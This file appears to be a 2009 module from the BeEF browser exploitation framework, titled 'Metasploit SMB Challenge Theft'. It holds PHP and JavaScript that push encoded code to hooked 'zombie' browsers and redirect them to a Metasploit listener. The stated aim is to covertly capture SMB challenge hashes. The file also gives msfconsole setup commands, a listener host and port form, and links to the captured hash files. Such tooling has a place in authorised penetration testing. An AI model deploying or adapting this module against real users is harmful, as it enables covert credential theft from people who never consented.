<?
        // Copyright (c) 2009, Ryan Linn (sussurro@happypacket.net)
        // All Rights Reserved
        // Template for code by:
        // wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
	
?>

<!--

BeEF: the following is the boiler plate from the exploit

-->
<script language="javascript" type="text/javascript">
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function($url) {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		b64code = b64replace(b64code, "URL",$url);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Metasploit SMB Challenge Theft</div>
This module launches a Metasploit listener that attempts to covertly steal SMB Challenge hashes. Once 
the Metasploit module has been launched, the targeted zombies will be redirected to Metasploit to attempt 
to capture credentials.<br><br>
Setup MSF to allow BeEF access (settings in /beef/ui/msf.php):<br>

<pre>
    sudo ./msfconsole
    msf > load xmlrpc Pass=BeEFMSFPass
</pre>
<div id="module_subsection">
	<form name="myform" id="myform">
		<div id="module_subsection_header">SRVHOST (Required)</div>
		<input type="text" name="SRVHOST" value="0.0.0.0"/>
		<div id="module_subsection_header">SRVPORT (Required)</div>
		<input type="text" name="SRVPORT" value="8080"/>
		<div id="module_subsection_header">URIPATH</div>
		<input type="text" name="URIPATH" value="beef"/>
		
		<input class="button" type="button" value=" Send Now " onClick="javascript:msf_smb_challenge_capture()"/><br>

	</form>
	<div class="entry">
	<br>
		After a successful exploitation the results can be found:<br>
		<a href=../cache/logfile>Captured hashes</a><br>
		<a href=../cache/pwfile>Captured hashes (Cain &amp; Able format)</a>
	</div>
</div>

